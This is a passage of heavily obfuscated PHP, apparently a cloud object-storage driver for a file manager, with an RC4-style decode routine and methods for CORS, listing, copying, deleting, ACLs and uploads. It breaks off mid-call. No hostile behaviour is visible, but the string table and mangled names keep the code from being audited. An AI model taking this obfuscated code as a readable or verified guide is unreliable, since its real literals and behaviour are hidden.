$A‘ÆÄÖ‹Ú = str_replace(array($d¦‡áª×Ğ[284], $d¦‡áª×Ğ[8], $d¦‡áª×Ğ[904]), array($d¦‡áª×Ğ[412], $d¦‡áª×Ğ[70], $d¦‡áª×Ğ[91]), $A‘ÆÄÖ‹Ú); return $A‘ÆÄÖ‹Ú; goto b”¥ßˆöµ£; b”¥ßˆöµ£: } public static function decode($a¿¶‘„‚Œ, $BÚŠ‘ªÑñ¨ = '') { goto EÍ÷¡ñÄœæ; EÍ÷¡ñÄœæ: $f¥ÔÔ­Ïä =& $_SERVER[Å¸ş]; $a¿¶‘„‚Œ = str_replace(array($f¥ÔÔ­Ïä[412], $f¥ÔÔ­Ïä[70], $f¥ÔÔ­Ïä[91]), array($f¥ÔÔ­Ïä[284], $f¥ÔÔ­Ïä[8], $f¥ÔÔ­Ïä[904]), $a¿¶‘„‚Œ); $CŞŸßæİåÂ = 4; goto aêÛê¯Ëö; aÖğÖ¼ùÌÛ: $d Œ¸Ú½Æï = substr($a¿¶‘„‚Œ, 0, $CŞŸßæİåÂ); $EŸ®¥¾„Ğ¬ = $e†˜ê£‘ . md5($e†˜ê£‘ . $d Œ¸Ú½Æï); $EƒÛÉö‘¶‘ = strlen($EŸ®¥¾„Ğ¬); goto e‡Òªøø¡ô; BËŸšâ×: $cª½Î±‹â = $f¥ÔÔ­Ïä[33]; for ($eßêÕÌ¡ = $B“¹ß = $c‹¸ÇÑì˜Û = 0; $c‹¸ÇÑì˜Û < $eÎ·Ä’…¶Ş; $c‹¸ÇÑì˜Û++) { $eßêÕÌ¡ = ($eßêÕÌ¡ + 1) % 256; $B“¹ß = ($B“¹ß + $CÛğ…áöœ[$eßêÕÌ¡]) % 256; $E¹À›¡‰æ­ = $CÛğ…áöœ[$eßêÕÌ¡]; $CÛğ…áöœ[$eßêÕÌ¡] = $CÛğ…áöœ[$B“¹ß]; $CÛğ…áöœ[$B“¹ß] = $E¹À›¡‰æ­; $cª½Î±‹â .= chr(ord($a¿¶‘„‚Œ[$c‹¸ÇÑì˜Û]) ^ $CÛğ…áöœ[($CÛğ…áöœ[$eßêÕÌ¡] + $CÛğ…áöœ[$B“¹ß]) % 256]); } $D‹òŸóÁ˜ö = intval(substr($cª½Î±‹â, 0, 10)); goto bò¤èí˜Ø; D¸ „‹Ì: for ($c‹¸ÇÑì˜Û = 0; $c‹¸ÇÑì˜Û <= 255; $c‹¸ÇÑì˜Û++) { $bç¥¼ŞÃ©ƒ[$c‹¸ÇÑì˜Û] = ord($EŸ®¥¾„Ğ¬[$c‹¸ÇÑì˜Û % $EƒÛÉö‘¶‘]); } $CÛğ…áöœ = range(0, 255); for ($B“¹ß = $c‹¸ÇÑì˜Û = 0; $c‹¸ÇÑì˜Û < 256; $c‹¸ÇÑì˜Û++) { $B“¹ß = ($B“¹ß + $CÛğ…áöœ[$c‹¸ÇÑì˜Û] + $bç¥¼ŞÃ©ƒ[$c‹¸ÇÑì˜Û]) % 256; $E¹À›¡‰æ­ = $CÛğ…áöœ[$c‹¸ÇÑì˜Û]; $CÛğ…áöœ[$c‹¸ÇÑì˜Û] = $CÛğ…áöœ[$B“¹ß]; $CÛğ…áöœ[$B“¹ß] = $E¹À›¡‰æ­; } goto BËŸšâ×; bò¤èí˜Ø: if (($D‹òŸóÁ˜ö == 0 || $D‹òŸóÁ˜ö - time() > 0) && substr($cª½Î±‹â, 10, 16) == substr(md5(substr($cª½Î±‹â, 26) . $F„©Øˆ†íã), 0, 16)) { return substr($cª½Î±‹â, 26); } else { return $f¥ÔÔ­Ïä[33]; } goto DáÁä´†ê˜; aêÛê¯Ëö: $BÚŠ‘ªÑñ¨ = md5($BÚŠ‘ªÑñ¨ ? $BÚŠ‘ªÑñ¨ : self::$defaultKey); $e†˜ê£‘ = md5(substr($BÚŠ‘ªÑñ¨, 0, 16)); $F„©Øˆ†íã = md5(substr($BÚŠ‘ªÑñ¨, 16, 16)); goto aÖğÖ¼ùÌÛ; e‡Òªøø¡ô: $a¿¶‘„‚Œ = base64_decode(substr($a¿¶‘„‚Œ, $CŞŸßæİåÂ)); $eÎ·Ä’…¶Ş = strlen($a¿¶‘„‚Œ); $bç¥¼ŞÃ©ƒ = array(); goto D¸ „‹Ì; DáÁä´†ê˜: } } define($_SERVER[Å¸ş][1935], 1); goto eƒâ½¢à¤¿; C´ã§Íº·Ô: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($F¨Æ¸¸ƒ‰â) { parent::__construct(); include_once SDK_DIR . $_SERVER[Å¸ş][1169]; $this->_init($F¨Æ¸¸ƒ‰â); } public function _init($bæô¯„ˆ) { foreach ($bæô¯„ˆ as $c—Ê„Œ”¡ª => $bæ„¬ÈƒÑÒ) { if (isset($this->{$c—Ê„Œ”¡ª})) { $this->{$c—Ê„Œ”¡ª} = $bæ„¬ÈƒÑÒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Å¸ş][1170], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto D•§ùÔøÃí; D•§ùÔøÃí: $FÑ‡˜°³åÏ =& $_SERVER[Å¸ş]; $D¥õªŠ«²¥ = new OSS\Model\CorsConfig(); $fŒİ‘´‘– = new OSS\Model\CorsRule(); goto DÇ¥¶…Œª‰; B¸Ğ£¸ö™¦: $D¥õªŠ«²¥->addRule($fŒİ‘´‘–); try { $this->client->putBucketCors($this->bucket, $D¥õªŠ«²¥); } catch (OSS\Core\OssException $FÀñŠ·†Æ) { return !1; } return !0; goto cìï‹Àá’Ş; dÅô®Í‘Áº: $fŒİ‘´‘–->addAllowedMethod($FÑ‡˜°³åÏ[1174]); $fŒİ‘´‘–->addAllowedMethod($FÑ‡˜°³åÏ[1175]); $fŒİ‘´‘–->addAllowedMethod($FÑ‡˜°³åÏ[155]); goto a»Ø ±À; DÇ¥¶…Œª‰: $fŒİ‘´‘–->addAllowedOrigin($FÑ‡˜°³åÏ[1171]); $fŒİ‘´‘–->addAllowedMethod($FÑ‡˜°³åÏ[1172]); $fŒİ‘´‘–->addAllowedMethod($FÑ‡˜°³åÏ[1173]); goto dÅô®Í‘Áº; a»Ø ±À: $fŒİ‘´‘–->setMaxAgeSeconds(600); $fŒİ‘´‘–->addExposeHeader($FÑ‡˜°³åÏ[1176]); $fŒİ‘´‘–->addAllowedHeader($FÑ‡˜°³åÏ[1171]); goto B¸Ğ£¸ö™¦; cìï‹Àá’Ş: } public function getBucketCors() { goto a°Ù§¦êß‹; fˆ¢–ˆŠ—: return array($b÷…Æ¢Ò‰ß[175] => isset($CƒöÏö¸Ã÷[0]) ? $CƒöÏö¸Ã÷[0] : $b÷…Æ¢Ò‰ß[33], $b÷…Æ¢Ò‰ß[179] => $fíØñÓŠ÷, $b÷…Æ¢Ò‰ß[1177] => $AÒ«™Œ‹ˆ, $b÷…Æ¢Ò‰ß[1178] => isset($D¢²×ê±[0]) ? $D¢²×ê±[0] : $b÷…Æ¢Ò‰ß[33], $b÷…Æ¢Ò‰ß[177] => isset($A­·Šğ‡¤[0]) ? $A­·Šğ‡¤[0] : $b÷…Æ¢Ò‰ß[33]); goto aîœ¾„¨°; fË÷«Šõİ: if (!$F·ñ«õ·¯¦ || !($FÀÃµÙùÈØ = $F·ñ«õ·¯¦->getRules())) { return null; } $CƒöÏö¸Ã÷ = $FÀÃµÙùÈØ[0]->getAllowedOrigins(); $fíØñÓŠ÷ = $FÀÃµÙùÈØ[0]->getAllowedMethods(); goto a÷‘Í¸™; a÷‘Í¸™: $AÒ«™Œ‹ˆ = $FÀÃµÙùÈØ[0]->getMaxAgeSeconds(); $D¢²×ê± = $FÀÃµÙùÈØ[0]->getExposeHeaders(); $A­·Šğ‡¤ = $FÀÃµÙùÈØ[0]->getAllowedHeaders(); goto fˆ¢–ˆŠ—; a°Ù§¦êß‹: $b÷…Æ¢Ò‰ß =& $_SERVER[Å¸ş]; $F·ñ«õ·¯¦ = null; try { $F·ñ«õ·¯¦ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $c‰¨ÜšÍé¶) { return null; } goto fË÷«Šõİ; aîœ¾„¨°: } public function isBucketCors() { goto f¼œ‘õÖÚî; CŠ¦ÀÒ¾ : $a¨•œËÚìÒ = array($e¹’Ÿ¬ÈÅÑ[180], $e¹’Ÿ¬ÈÅÑ[181], $e¹’Ÿ¬ÈÅÑ[182], $e¹’Ÿ¬ÈÅÑ[183], $e¹’Ÿ¬ÈÅÑ[184]); $bİÔÙ­ç = array_diff($a¨•œËÚìÒ, $d¥ê¹íÑ…Ñ); return empty($bİÔÙ­ç); goto D×šèš¹”; Eå ´†ë¾: if ($EÄÔ™£®×ª[$e¹’Ÿ¬ÈÅÑ[175]] != $e¹’Ÿ¬ÈÅÑ[176] || $EÄÔ™£®×ª[$e¹’Ÿ¬ÈÅÑ[177]] != $e¹’Ÿ¬ÈÅÑ[176]) { return !1; } $d¥ê¹íÑ…Ñ = array_map($e¹’Ÿ¬ÈÅÑ[178], $EÄÔ™£®×ª[$e¹’Ÿ¬ÈÅÑ[179]]); if (!is_array($d¥ê¹íÑ…Ñ)) { $d¥ê¹íÑ…Ñ = array(); } goto CŠ¦ÀÒ¾ ; f¼œ‘õÖÚî: $e¹’Ÿ¬ÈÅÑ =& $_SERVER[Å¸ş]; $EÄÔ™£®×ª = $this->getBucketCors(); if (!$EÄÔ™£®×ª || !is_array($EÄÔ™£®×ª)) { return !1; } goto Eå ´†ë¾; D×šèš¹”: } public function mkfile($f›Ç§îœ˜š, $dÕ§³ÒËù˜ = '', $FƒĞùºïí = REPEAT_RENAME) { $aÍŠ°êÖ = $this->setContent($f›Ç§îœ˜š, $dÕ§³ÒËù˜); if ($aÍŠ°êÖ !== !1) { return $this->getPathOuter($f›Ç§îœ˜š); } return !1; } public function mkdir($bæ‚Ô¡¼†á, $F‹äÆö ®ˆ = REPEAT_SKIP) { if ($this->_isFolder($bæ‚Ô¡¼†á)) { return $this->getPathOuter($bæ‚Ô¡¼†á); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($bæ‚Ô¡¼†á)); } catch (OSS\Core\OssException $CóŠøæ»æÁ) { return !1; } return $this->getPathOuter($bæ‚Ô¡¼†á); } private function fileList($A—²¼”—è¸, $CÉóô…æ®À = '', $d†­Š Ğ± = 0) { goto fÍ¬¹ß·¥Û; fÛŸÉ³®Ç½: $F˜Úè©°Ôã = $dÄ‡åä’¥ö[33]; $BëîÕ´¿ğÎ = 1000; $Fæ‘•ªÎùÛ = $Bˆ¢â÷³¦ = array(); goto Dö¶×óìæò; Dö¶×óìæò: while (!0) { $AëĞéÃ¶ß = array($dÄ‡åä’¥ö[1179] => $CÉóô…æ®À, $dÄ‡åä’¥ö[186] => $fŞÌ²ƒª–, $dÄ‡åä’¥ö[1180] => $BëîÕ´¿ğÎ, $dÄ‡åä’¥ö[1181] => $F˜Úè©°Ôã); try { $e‹™®Ì¶Úâ = $this->client->listObjects($this->bucket, $AëĞéÃ¶ß); } catch (OSS\Core\OssException $FÔÍ›½†ìĞ) { break; } $F˜Úè©°Ôã = $e‹™®Ì¶Úâ->getNextMarker(); $CÛ±®§®Ô = $e‹™®Ì¶Úâ->getObjectList(); $f¶É‚¬™¹ = $e‹™®Ì¶Úâ->getPrefixList(); foreach ($CÛ±®§®Ô as $c¢‡“˜ˆ…) { if ($c¢‡“˜ˆ…->getKey() == $fŞÌ²ƒª–) { continue; } $d‹…ËëíôÖ = $c¢‡“˜ˆ…->getKey(); if ($d†­Š Ğ±) { $d‹…ËëíôÖ = array($dÄ‡åä’¥ö[28] => $d‹…ËëíôÖ, $dÄ‡åä’¥ö[77] => $c¢‡“˜ˆ…->getSize(), $dÄ‡åä’¥ö[190] => strtotime($c¢‡“˜ˆ…->getLastModified())); } $Bˆ¢â÷³¦[] = $d‹…ËëíôÖ; } foreach ($f¶É‚¬™¹ as $a®³…¿çí×) { $Fæ‘•ªÎùÛ[] = $a®³…¿çí×->getPrefix(); } if ($F˜Úè©°Ôã === $dÄ‡åä’¥ö[33]) { break; } } return array($dÄ‡åä’¥ö[74] => $Fæ‘•ªÎùÛ, $dÄ‡åä’¥ö[73] => $Bˆ¢â÷³¦); goto fÜÕó–ôÔ; fÍ¬¹ß·¥Û: $dÄ‡åä’¥ö =& $_SERVER[Å¸ş]; $A—²¼”—è¸ = trim($A—²¼”—è¸, $dÄ‡åä’¥ö[8]); $fŞÌ²ƒª– = empty($A—²¼”—è¸) ? $dÄ‡åä’¥ö[33] : $A—²¼”—è¸ . $dÄ‡åä’¥ö[8]; goto fÛŸÉ³®Ç½; fÜÕó–ôÔ: } public function copyFile($eÂåàá±»‘, $FŸµª÷ŒÔ“) { $CÖˆíôæ‚Š = $this->size($eÂåàá±»‘); if ($CÖˆíôæ‚Š < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $eÂåàá±»‘, $this->bucket, $this->pathEncode($FŸµª÷ŒÔ“)); } catch (OSS\Core\OssException $cîÇ¼Áö½Ò) { return !1; } return $this->getPathOuter($FŸµª÷ŒÔ“); } $EÈÜÛÙ“­’ = $this->multiCopyObject($eÂåàá±»‘, $FŸµª÷ŒÔ“, $CÖˆíôæ‚Š); return $EÈÜÛÙ“­’ ? $this->getPathOuter($FŸµª÷ŒÔ“) : !1; } private function multiCopyObject($aˆ—‹öæµæ, $CË¶Ê‰å‘…, $DÔƒ°î§Ôì) { $f¿³™¥±š =& $_SERVER[Å¸ş]; try { goto d¶Éºƒ‚¯”; EÂÜğë ò–: $B”©Íœöî… = 1024 * 1024 * 10; $Aó´¼µƒÂ = $this->client->generateMultiuploadParts($DÔƒ°î§Ôì, $B”©Íœöî…); foreach ($Aó´¼µƒÂ as $f¤™ØÛ¼ìõ => $C®¸îğâİ) { $E¹®¹ÎÔ…Ò = $F¬¶‡³ì¤ + (int) $C®¸îğâİ[$f¿³™¥±š[1183]]; $aõàÍó÷Öğ = (int) $C®¸îğâİ[$f¿³™¥±š[325]] + $E¹®¹ÎÔ…Ò - 1; $cÌ·‚Ü×òË = array($f¿³™¥±š[1184] => $E¹®¹ÎÔ…Ò, $f¿³™¥±š[1185] => $aõàÍó÷Öğ); $cÚ¯åÑ˜¨Ğ[] = $this->client->uploadPartCopy($this->bucket, $aˆ—‹öæµæ, $this->bucket, $this->pathEncode($CË¶Ê‰å‘…), $cëëö‡‰«ï, $FÔÖÕ÷‹Ç†, $cÌ·‚Ü×òË); $cëëö‡‰«ï = $cëëö‡‰«ï + 1; } goto c¸Óó‚¸Û”; c¸Óó‚¸Û”: $cõ™½‹¡š¾ = array(); foreach ($cÚ¯åÑ˜¨Ğ as $f¤™ØÛ¼ìõ => $Cİ¿é˜ÊÉª) { $cõ™½‹¡š¾[] = array($f¿³™¥±š[1186] => $f¤™ØÛ¼ìõ + 1, $f¿³™¥±š[1187] => $Cİ¿é˜ÊÉª); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($CË¶Ê‰å‘…), $FÔÖÕ÷‹Ç†, $cõ™½‹¡š¾); goto c¨Ï¯ŒáÅ½; d¶Éºƒ‚¯”: $b²¼Ø¶®È³ = array(); if ($EÌ½ÑË¨¬ = $this->hashMd5($aˆ—‹öæµæ)) { $b²¼Ø¶®È³ = array(OSS\OssClient::OSS_HEADERS => array($f¿³™¥±š[1182] => $EÌ½ÑË¨¬)); } $FÔÖÕ÷‹Ç† = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($CË¶Ê‰å‘…), $b²¼Ø¶®È³); goto C¬À¶‚ß…; C¬À¶‚ß…: $cëëö‡‰«ï = 1; $F¬¶‡³ì¤ = 0; $cÚ¯åÑ˜¨Ğ = array(); goto EÂÜğë ò–; c¨Ï¯ŒáÅ½: } catch (OSS\Core\OssException $fÜÀ‘âÑÛí) { return !1; } return !0; } public function moveFile($bÈÌÓï‰ò, $FÇªäğáî) { if ($this->copyFile($bÈÌÓï‰ò, $FÇªäğáî)) { $this->remove($bÈÌÓï‰ò); return $this->getPathOuter($FÇªäğáî); } return !1; } public function delFile($cÑ¢²ùÉ½ì) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cÑ¢²ùÉ½ì)); } catch (OSS\Core\OssException $b´›‡âÚ±¦) { return !1; } return !0; } public function delFolder($BŞí‘Êîô) { $F·©³“ÄÚ =& $_SERVER[Å¸ş]; $eƒ˜å„ÃëË = $this->fileList($BŞí‘Êîô); if (!empty($BŞí‘Êîô) && !in_array(trim($BŞí‘Êîô, $F·©³“ÄÚ[8]) . $F·©³“ÄÚ[8], $eƒ˜å„ÃëË[$F·©³“ÄÚ[73]])) { $eƒ˜å„ÃëË[$F·©³“ÄÚ[73]][] = trim($BŞí‘Êîô, $F·©³“ÄÚ[8]) . $F·©³“ÄÚ[8]; } foreach (array_chunk($eƒ˜å„ÃëË[$F·©³“ÄÚ[73]], 1000) as $c•Ê‹º¥Œğ) { try { $this->client->deleteObjects($this->bucket, $c•Ê‹º¥Œğ); } catch (OSS\Core\OssException $E¥†Ó”ï†Š) { continue; } } return !0; } public function rename($A¦ÃÏ¿‹ß¥, $b‘¿Œ â£“) { return $this->renameObject($A¦ÃÏ¿‹ß¥, $b‘¿Œ â£“); } private function fileInfo($AÅàÖ¸È”‹, $E¦İ‰ê²Æî = array()) { goto f½òÛòâî¦; f½òÛòâî¦: $B ·ùîÔï¶ =& $_SERVER[Å¸ş]; $aê¡Í­¡ï = array($B ·ùîÔï¶[28] => $this->pathThis($AÅàÖ¸È”‹), $B ·ùîÔï¶[75] => $this->getPathOuter($AÅàÖ¸È”‹), $B ·ùîÔï¶[29] => $B ·ùîÔï¶[167], $B ·ùîÔï¶[187] => 0, $B ·ùîÔï¶[107] => 0, $B ·ùîÔï¶[77] => 0, $B ·ùîÔï¶[160] => $this->ext($AÅàÖ¸È”‹), $B ·ùîÔï¶[188] => !0, $B ·ùîÔï¶[189] => !0); if (empty($E¦İ‰ê²Æî)) { $FÓÙ“Óº = $this->objectMeta($AÅàÖ¸È”‹); if (!$FÓÙ“Óº) { return $aê¡Í­¡ï; } $E¦İ‰ê²Æî = array($B ·ùîÔï¶[107] => strtotime($FÓÙ“Óº[$B ·ùîÔï¶[1188]]), $B ·ùîÔï¶[77] => $FÓÙ“Óº[$B ·ùîÔï¶[1189]] + 0); } goto fæ¨íÓ×¯§; dâ°ÑÃÎ¬ª: return $aê¡Í­¡ï; goto dç£½Šµùõ; fæ¨íÓ×¯§: if (isset($E¦İ‰ê²Æî[$B ·ùîÔï¶[77]])) { $aê¡Í­¡ï[$B ·ùîÔï¶[77]] = $E¦İ‰ê²Æî[$B ·ùîÔï¶[77]]; } if (isset($E¦İ‰ê²Æî[$B ·ùîÔï¶[107]])) { $aê¡Í­¡ï[$B ·ùîÔï¶[107]] = $E¦İ‰ê²Æî[$B ·ùîÔï¶[107]]; } if (isset($E¦İ‰ê²Æî[$B ·ùîÔï¶[190]]) && !trim($aê¡Í­¡ï[$B ·ùîÔï¶[107]])) { $aê¡Í­¡ï[$B ·ùîÔï¶[107]] = $E¦İ‰ê²Æî[$B ·ùîÔï¶[190]]; } goto dâ°ÑÃÎ¬ª; dç£½Šµùõ: } private function folderInfo($a¸–æÀåßõ, $EÃóŠ‡å• = array()) { $C«±ƒ¤ƒÎ =& $_SERVER[Å¸ş]; $e¬†‹È®Øà = array($C«±ƒ¤ƒÎ[28] => $this->pathThis($a¸–æÀåßõ), $C«±ƒ¤ƒÎ[75] => $this->getPathOuter($C«±ƒ¤ƒÎ[8] . $a¸–æÀåßõ), $C«±ƒ¤ƒÎ[29] => $C«±ƒ¤ƒÎ[76], $C«±ƒ¤ƒÎ[187] => 0, $C«±ƒ¤ƒÎ[107] => 0, $C«±ƒ¤ƒÎ[188] => !0, $C«±ƒ¤ƒÎ[189] => !0); if (empty($EÃóŠ‡å•)) { $a¸–æÀåßõ = rtrim($a¸–æÀåßõ, $C«±ƒ¤ƒÎ[8]) . $C«±ƒ¤ƒÎ[8]; $bØã—„¥´ = $this->objectMeta($a¸–æÀåßõ); if (!$bØã—„¥´) { return $e¬†‹È®Øà; } $EÃóŠ‡å• = array($C«±ƒ¤ƒÎ[187] => $bØã—„¥´[$C«±ƒ¤ƒÎ[1190]][$C«±ƒ¤ƒÎ[1191]], $C«±ƒ¤ƒÎ[107] => strtotime($bØã—„¥´[$C«±ƒ¤ƒÎ[1188]])); } if (isset($EÃóŠ‡å•[$C«±ƒ¤ƒÎ[107]])) { $e¬†‹È®Øà[$C«±ƒ¤ƒÎ[107]] = $EÃóŠ‡å•[$C«±ƒ¤ƒÎ[107]]; } if (isset($EÃóŠ‡å•[$C«±ƒ¤ƒÎ[187]])) { $e¬†‹È®Øà[$C«±ƒ¤ƒÎ[187]] = $EÃóŠ‡å•[$C«±ƒ¤ƒÎ[187]]; } return $e¬†‹È®Øà; } public function listPath($f±˜àÎÒ¾é, $d˜˜Í¿¯Â = false) { $A“äÙ‚öŒ… =& $_SERVER[Å¸ş]; $EâÇª‡‹ê = $this->fileList($f±˜àÎÒ¾é, $A“äÙ‚öŒ…[8], !0); foreach ($EâÇª‡‹ê[$A“äÙ‚öŒ…[74]] as $F¸øôŞ ¹Í => $eƒ²õİ®Ğ) { $EâÇª‡‹ê[$A“äÙ‚öŒ…[74]][$F¸øôŞ ¹Í] = $this->folderInfo($eƒ²õİ®Ğ, $eƒ²õİ®Ğ); } foreach ($EâÇª‡‹ê[$A“äÙ‚öŒ…[73]] as $F¸øôŞ ¹Í => $eƒ²õİ®Ğ) { $EâÇª‡‹ê[$A“äÙ‚öŒ…[73]][$F¸øôŞ ¹Í] = $this->fileInfo($eƒ²õİ®Ğ[$A“äÙ‚öŒ…[28]], $eƒ²õİ®Ğ); } return $EâÇª‡‹ê; } public function has($D“Á‹¶Şèä, $DÛœ•äÌ£„ = false, $AÚ‘Ú¡Ç³² = true) { goto cß”àœÔ¡; b¤Ê‚ÓŠ‘: $BìÆÔÚö» = $E²±‡×ØÒä[33]; $fİà—™„Á¯ = 500; $c‘îİ£ì£ = 0; goto f’‡Ù¹»Ú; f’‡Ù¹»Ú: $e³‚˜àÌ”¾ = 0; while (!0) { $cãğì¡ˆ’ = array($E²±‡×ØÒä[1179] => $E²±‡×ØÒä[8], $E²±‡×ØÒä[186] => $dÎÛš—„¹‚, $E²±‡×ØÒä[1180] => $fİà—™„Á¯, $E²±‡×ØÒä[1181] => $BìÆÔÚö»); try { $fëœÓñË¶ = $this->client->listObjects($this->bucket, $cãğì¡ˆ’); } catch (OSS\Core\OssException $c›ò ¶ôÜ) { break; } $BìÆÔÚö» = $fëœÓñË¶->getNextMarker(); $CóÙ¿Âİ£ = $fëœÓñË¶->getObjectList(); $DñèƒÉÄ‹Ì = $fëœÓñË¶->getPrefixList(); if ($DÛœ•äÌ£„) { if (count($CóÙ¿Âİ£) > 1 || count($CóÙ¿Âİ£) == 1 && $CóÙ¿Âİ£[0]->getKey() != $dÎÛš—„¹‚) { $c‘îİ£ì£ += count($CóÙ¿Âİ£) - 1; } if (!empty($DñèƒÉÄ‹Ì)) { $e³‚˜àÌ”¾ += count($DñèƒÉÄ‹Ì); } if ($BìÆÔÚö» === $E²±‡×ØÒä[33]) { break; } continue; } if ($AÚ‘Ú¡Ç³²) { if (!empty($CóÙ¿Âİ£)) { if (count($CóÙ¿Âİ£) > 1 || $CóÙ¿Âİ£[0]->getKey() != $dÎÛš—„¹‚) { return !0; } } } else { if (!empty($DñèƒÉÄ‹Ì)) { return !0; } } if ($BìÆÔÚö» === $E²±‡×ØÒä[33]) { break; } } if ($DÛœ•äÌ£„) { return array($E²±‡×ØÒä[191] => $c‘îİ£ì£, $E²±‡×ØÒä[192] => $e³‚˜àÌ”¾); } goto F•Şù‡˜»; cß”àœÔ¡: $E²±‡×ØÒä =& $_SERVER[Å¸ş]; $D“Á‹¶Şèä = trim($D“Á‹¶Şèä, $E²±‡×ØÒä[8]); $dÎÛš—„¹‚ = empty($D“Á‹¶Şèä) ? $E²±‡×ØÒä[33] : $D“Á‹¶Şèä . $E²±‡×ØÒä[8]; goto b¤Ê‚ÓŠ‘; F•Şù‡˜»: return !1; goto Aãë¼¡ô’È; Aãë¼¡ô’È: } public function listAll($cÇËåÌ°é•) { $F¨ëğ¥éÃ =& $_SERVER[Å¸ş]; $EìŞÉçğ§ = $this->fileList($cÇËåÌ°é•, $F¨ëğ¥éÃ[33], !0); $bĞÅË–Ø© = array(); foreach ($EìŞÉçğ§[$F¨ëğ¥éÃ[73]] as $FÒÊ‡ƒêŸ×) { $bĞÅË–Ø©[$FÒÊ‡ƒêŸ×[$F¨ëğ¥éÃ[28]]] = $FÒÊ‡ƒêŸ×[$F¨ëğ¥éÃ[77]]; } return $this->listAllFiles($cÇËåÌ°é•, array_keys($bĞÅË–Ø©), $bĞÅË–Ø©); } public function canRead($CÛ‘±™Ì´‡) { $DºùùÍë° =& $_SERVER[Å¸ş]; $DÑä×ºÒÅ = $this->pathAcl($CÛ‘±™Ì´‡); return $DÑä×ºÒÅ == $DºùùÍë°[1192] || $DÑä×ºÒÅ == $DºùùÍë°[493] ? !0 : !1; } public function canWrite($f–·‚ùëõ÷) { $Eô‚Ó©«Œ  = $this->pathAcl($f–·‚ùëõ÷); return $Eô‚Ó©«Œ  == $_SERVER[Å¸ş][493] ? !0 : !1; } public function pathAcl($Dçî“ã¯—) { goto FÖî…Ù‹¿; FÔ„Ò½š‚: return $fòŠïÓĞÇ“; goto Câ•‰»¨£’; aè’òÏô³Æ: $fòŠïÓĞÇ“ = $d÷Ñ¾é‹©¥ == $e†È½”˜è…[34] ? $this->bucketAcl : $d÷Ñ¾é‹©¥; if ($fòŠïÓĞÇ“ == $e†È½”˜è…[1193]) { return $e†È½”˜è…[1192]; } if ($fòŠïÓĞÇ“ == $e†È½”˜è…[1194]) { return $e†È½”˜è…[493]; } goto FÔ„Ò½š‚; FÖî…Ù‹¿: $e†È½”˜è… =& $_SERVER[Å¸ş]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d÷Ñ¾é‹©¥ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Dçî“ã¯—)); } catch (OSS\Core\OssException $e†Œ¤ğÆ¡) { return !1; } goto aè’òÏô³Æ; Câ•‰»¨£’: } private function chmodPath($d¾¶Í¥½Ê¾, $Aõ¨›¿ŒŞ = '') { $E‚æÑ¬ºô =& $_SERVER[Å¸ş]; $dê Ãº¾óé = empty($Aõ¨›¿ŒŞ) ? $E‚æÑ¬ºô[1194] : $Aõ¨›¿ŒŞ; $fõ¼ª˜æ• = array($E‚æÑ¬ºô[34], $E‚æÑ¬ºô[185], $E‚æÑ¬ºô[1193], $E‚æÑ¬ºô[1194]); if (!in_array($dê Ãº¾óé, $fõ¼ª˜æ•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($d¾¶Í¥½Ê¾), $dê Ãº¾óé); } catch (OSS\Core\OssException $Cˆè¦©¹´) { return !1; } return !0; } public function getContent($e†ã›Ê¨„å) { return $this->fileSubstr($e†ã›Ê¨„å, -1); } public function setContent($dëÄåŒ¸”, $eÃéóãçØ = '') { $Bä”ÃèÊÜ =& $_SERVER[Å¸ş]; try { $eãî‘Âá³° = $this->trafficLimit($Bä”ÃèÊÜ[1195]); $a¡Ñ«ƒÑŠá = $this->client->putObject($this->bucket, $this->pathEncode($dëÄåŒ¸”), $eÃéóãçØ, $eãî‘Âá³°); } catch (OSS\Core\OssException $FëÁìÉéƒ) { return !1; } $d¬âÚÆ­² = array($Bä”ÃèÊÜ[1182] => trim($a¡Ñ«ƒÑŠá[$Bä”ÃèÊÜ[1196]], $Bä”ÃèÊÜ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dëÄåŒ¸”))); $this->updateObjMeta($dëÄåŒ¸”, $d¬âÚÆ­²); return isset($a¡Ñ«ƒÑŠá[$Bä”ÃèÊÜ[1197]][$Bä”ÃèÊÜ[1144]]) ? (int) $a¡Ñ«ƒÑŠá[$Bä”ÃèÊÜ[1197]][$Bä”ÃèÊÜ[1144]] : strlen($a¡Ñ«ƒÑŠá); } private function updateObjMeta($a‘íÃ”ƒ, $CÍ¸Öª¡ôâ) { $a‘íÃ”ƒ = $this->pathEncode($a‘íÃ”ƒ); try { $CìÙïÖŠÙ¾ = array(OSS\OssClient::OSS_HEADERS => $CÍ¸Öª¡ôâ); $this->client->copyObject($this->bucket, $a‘íÃ”ƒ, $this->bucket, $a‘íÃ”ƒ, $CìÙïÖŠÙ¾); } catch (OSS\Core\OssException $eå£·¿Üá) { return !1; } return !0; } public function upload($BÙÌÙ’µÄ˜, $F‹§Ñ¹§Š², $a¢Îï¡ÕÍ = false, $C‘Ó‰§í·· = REPEAT_REPLACE) { $dÅ„Å¾Œ =& $_SERVER[Å¸ş]; $e‘âå¢’ = trim($BÙÌÙ’µÄ˜, $dÅ„Å¾Œ[8]); $D ËÈ‚ë = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($dÅ„Å¾Œ[1182] => @md5_file($F‹§Ñ¹§Š²)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BÙÌÙ’µÄ˜))); $D ËÈ‚ë = $this->trafficLimit($dÅ„Å¾Œ[1195], $D ËÈ‚ë); try { $this->client->multiuploadFile($this->bucket, 